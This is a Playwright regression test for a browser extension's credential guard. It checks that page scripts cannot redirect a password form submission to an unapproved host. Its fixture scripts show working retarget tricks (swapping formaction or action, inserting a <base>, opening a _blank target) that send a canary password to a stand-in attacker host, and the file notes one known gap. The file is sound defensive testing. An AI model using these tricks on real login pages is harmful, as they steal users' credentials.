/**
 * #1084: the credential guard's own resubmission must reach only the
 * destination it approved.
 *
 * The guard stops the user's password-form submit, assesses the destination,
 * then resumes with `requestSubmit(submitter)`. That dispatches a new trusted
 * `submit` event the guard lets through, so the page's own `submit` (and
 * later `formdata`) listeners run after the guard's last destination check and
 * before the browser reads the action. A page listener that swaps `formaction`,
 * `action` or `formtarget` there used to send the canary to a host nobody
 * approved.
 *
 * Both hosts are fake and served by request interception, so every POST is
 * counted at the network boundary: the attacker sink must see zero canaries.
 */
import { chromium, expect, test, type BrowserContext, type Page, type Worker } from "@playwright/test";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
import { clickModalButton, getServiceWorker, waitForCredentialModal } from "./extension_test_utils";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const extensionPath = process.env.EXTENSION_PATH
  ? path.resolve(process.env.EXTENSION_PATH)
  : path.resolve(__dirname, "..", "..", "extension", "dist");

const LOGIN_URL = "http://victim.test/login";
const APPROVED_URL = "http://victim.test/session";
const ATTACKER_URL = "http://attacker.test/collect";
const CANARY = "canary-password-1084";

test.setTimeout(120_000);

type Retarget =
  | "none"
  | "submit-formaction"
  | "submit-action"
  | "submit-base"
  | "submit-formaction-blank"
  | "formdata-action";
type Sinks = { approved: string[]; attacker: string[]; resumedSubmits: number };

const FIXTURE = `<!doctype html><html><body>
<form id="login" method="post" action="${APPROVED_URL}">
  <input name="user" value="synthetic@example.invalid">
  <input id="password" name="password" type="password" value="${CANARY}">
  <button id="go" type="submit">Sign in</button>
</form></body></html>`;

async function withVictimPage(
  prompted: boolean,
  run: (page: Page, sinks: Sinks, context: BrowserContext) => Promise<void>,
): Promise<void> {
  const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), "navsentinel-cred-retarget-"));
  let context: BrowserContext | null = null;
  try {
    context = await chromium.launchPersistentContext(userDataDir, {
      headless: false,
      timeout: 60_000,
      args: [`--disable-extensions-except=${extensionPath}`, `--load-extension=${extensionPath}`],
    });
    const serviceWorker: Worker = await getServiceWorker(context);
    await expect.poll(() => serviceWorker.evaluate(() => typeof chrome.storage?.local?.set === "function")).toBe(true);
    await serviceWorker.evaluate(
      async ({ settingsKey, prompted }) => {
        await chrome.storage.local.set({
          [settingsKey]: {
            nav: { defaultMode: "smart", debug: false },
            credential: {
              mode: "smart",
              promptOnUntrustedDomain: prompted,
              promptOnMediumRisk: false,
              mediumRiskThreshold: 100,
              blockHttpPasswordSubmit: false,
              warnOnPaste: false,
              similarity: { enabled: true, maxDistance: 2 },
            },
            logLimit: 300,
          },
        });
      },
      { settingsKey: SUITE_SETTINGS_KEY, prompted },
    );

    const sinks: Sinks = { approved: [], attacker: [], resumedSubmits: 0 };
    await context.route("http://victim.test/**", async (route) => {
      const request = route.request();
      if (request.url() === LOGIN_URL) {
        await route.fulfill({ contentType: "text/html", body: FIXTURE });
        return;
      }
      if (request.url().startsWith(APPROVED_URL)) sinks.approved.push(`${request.method()} ${request.postData() ?? ""}`);
      await route.fulfill({ contentType: "text/html", body: "<p>approved sink</p>" });
    });
    await context.route("http://attacker.test/**", async (route) => {
      const request = route.request();
      sinks.attacker.push(`${request.method()} ${request.url()} ${request.postData() ?? ""}`);
      await route.fulfill({ contentType: "text/html", body: "<p>attacker sink</p>" });
    });

    const page = await context.newPage();
    page.on("console", (message) => {
      if (message.text() === "fixture:resumed-submit") sinks.resumedSubmits += 1;
    });
    await page.goto(LOGIN_URL, { waitUntil: "domcontentloaded" });
    // The credential guard is a document_start content script; wait until its
    // settings cache can have primed before the first submit.
    await page.waitForTimeout(300);
    await run(page, sinks, context);
  } finally {
    await context?.close();
    fs.rmSync(userDataDir, { recursive: true, force: true });
  }
}

/** Page-world (attacker-controlled) script, installed before the user's click. */
async function installRetarget(page: Page, mode: Retarget): Promise<void> {
  await page.evaluate(
    ({ mode, attacker }) => {
      const form = document.getElementById("login") as HTMLFormElement;
      const go = document.getElementById("go") as HTMLButtonElement;
      form.addEventListener("submit", () => {
        console.log("fixture:resumed-submit");
        if (mode === "submit-formaction") go.setAttribute("formaction", attacker);
        if (mode === "submit-action") form.action = attacker;
        if (mode === "submit-base") {
          // A relative action resolved against a <base> inserted mid-event.
          form.setAttribute("action", "collect");
          const base = document.createElement("base");
          base.href = new URL("/", attacker).href;
          document.head.appendChild(base);
        }
        if (mode === "submit-formaction-blank") {
          go.setAttribute("formaction", attacker);
          go.setAttribute("formtarget", "_blank");
        }
      });
      if (mode === "formdata-action") {
        form.addEventListener("formdata", () => {
          form.action = attacker;
        });
      }
    },
    { mode, attacker: ATTACKER_URL },
  );
}

async function expectNoAttackerPost(page: Page, sinks: Sinks): Promise<void> {
  // TEST_INVALID guard: the page listener must have seen the guard's resumed
  // submit, otherwise the retarget never had a chance to run.
  await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBe(1);
  await page.waitForTimeout(2_000);
  expect(sinks.attacker, "the attacker sink must receive zero canary POSTs").toEqual([]);
  expect(sinks.approved, "a retargeted submit is stopped, not sent to the old host either").toEqual([]);
  // The guard re-checks the destination the page moved to, before any page
  // listener runs, and prompts for it. Declining sends nothing anywhere.
  await waitForCredentialModal(page);
  await clickModalButton(page, "Cancel");
  await page.waitForTimeout(1_000);
  expect(sinks.attacker).toEqual([]);
  expect(sinks.approved).toEqual([]);
  expect(sinks.resumedSubmits, "the re-check submit must not reach page listeners").toBe(1);
}

test("silent allow without a retarget still POSTs to the approved destination (control) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(false, async (page, sinks) => {
    await installRetarget(page, "none");
    await page.click("#go", { noWaitAfter: true });
    await expect.poll(() => sinks.approved.length, { timeout: 10_000 }).toBe(1);
    expect(sinks.approved[0]).toContain(`password=${CANARY}`);
    expect(sinks.attacker).toEqual([]);
  });
});

for (const mode of ["submit-formaction", "submit-action", "submit-base"] as const) {
  test(`silent allow: a ${mode} retarget in the resumed submit sends nothing to the attacker (#1084) @regression`, async () => {
    test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
    await withVictimPage(false, async (page, sinks) => {
      await installRetarget(page, mode);
      await page.click("#go", { noWaitAfter: true });
      await expectNoAttackerPost(page, sinks);
    });
  });
}

test("silent allow: a retarget into a new window is a known gap (#1084) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  // Measured in Chromium: once the browser has chosen a new (_blank) window for
  // the POST, neither window.stop() nor disconnecting the form cancels it, and
  // the isolated world has no hook between the page's last submit listener and
  // that choice. Flip this when the follow-up keeps the resumed submit away from
  // page listeners.
  test.fail();
  await withVictimPage(false, async (page, sinks) => {
    await installRetarget(page, "submit-formaction-blank");
    await page.click("#go", { noWaitAfter: true });
    await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBe(1);
    await page.waitForTimeout(2_000);
    expect(sinks.attacker).toEqual([]);
  });
});

test("silent allow: a formdata-time retarget is ignored by the browser (#1084) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  // Measured browser semantics: Chromium fixes the action, method, target and
  // base URL before it fires formdata, so a formdata listener cannot retarget.
  await withVictimPage(false, async (page, sinks) => {
    await installRetarget(page, "formdata-action");
    await page.click("#go", { noWaitAfter: true });
    await expect.poll(() => sinks.approved.length, { timeout: 10_000 }).toBe(1);
    expect(sinks.approved[0]).toContain(`password=${CANARY}`);
    expect(sinks.attacker).toEqual([]);
  });
});

test("Proceed once: a formaction retarget in the resumed submit sends nothing to the attacker (#1084) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(true, async (page, sinks) => {
    await installRetarget(page, "submit-formaction");
    await page.click("#go", { noWaitAfter: true });
    await waitForCredentialModal(page);
    await clickModalButton(page, "Proceed once");
    await expectNoAttackerPost(page, sinks);
  });
});

test("Proceed once without a retarget still POSTs to the approved destination (control) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(true, async (page, sinks) => {
    await installRetarget(page, "none");
    await page.click("#go", { noWaitAfter: true });
    await waitForCredentialModal(page);
    await clickModalButton(page, "Proceed once");
    await expect.poll(() => sinks.approved.length, { timeout: 10_000 }).toBe(1);
    expect(sinks.attacker).toEqual([]);
  });
});

test("a re-checked retarget still submits once the user approves the destination it moved to (#1084) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  // A legacy page that sets a cross-site action in its submit handler on every
  // submit must not be blocked forever: the user approves the real destination.
  await withVictimPage(false, async (page, sinks) => {
    await installRetarget(page, "submit-formaction");
    await page.click("#go", { noWaitAfter: true });
    await waitForCredentialModal(page);
    expect(sinks.attacker).toEqual([]);
    await clickModalButton(page, "Proceed once");
    await expect.poll(() => sinks.attacker.length, { timeout: 10_000 }).toBe(1);
    expect(sinks.attacker[0]).toContain(`password=${CANARY}`);
    expect(sinks.approved).toEqual([]);
    expect(sinks.resumedSubmits).toBe(2);
  });
});
